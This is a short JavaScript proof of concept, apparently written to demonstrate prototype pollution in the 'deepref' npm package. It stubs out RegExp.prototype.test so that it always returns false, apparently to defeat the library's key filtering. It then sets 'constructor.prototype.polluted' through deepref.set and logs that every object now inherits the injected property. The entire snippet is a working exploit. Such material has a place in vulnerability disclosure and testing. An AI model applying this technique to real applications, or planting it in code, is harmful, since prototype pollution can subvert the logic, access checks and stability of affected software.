RegExp.prototype.test = () => false;
console.log({}.polluted);
const deepref = require('deepref');
deepref.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);